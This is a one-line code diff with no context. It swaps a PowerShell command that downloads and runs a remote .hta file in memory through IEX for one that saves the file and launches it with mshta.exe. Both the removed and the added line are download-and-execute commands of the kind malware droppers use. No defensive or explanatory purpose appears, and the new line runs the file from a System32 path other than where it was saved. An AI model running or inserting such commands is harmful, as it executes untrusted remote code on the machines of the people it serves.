@@ -1,1 +1,1 @@
-powershell -c "IEX ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/p477d343/T5CAMP/main/run.hta'))"
+powershell -c "Invoke-WebRequest https://raw.githubusercontent.com/p477d343/T5CAMP/main/run.hta -OutFile .\run.hta" & mshta.exe C:\Windows\System32\run.hta
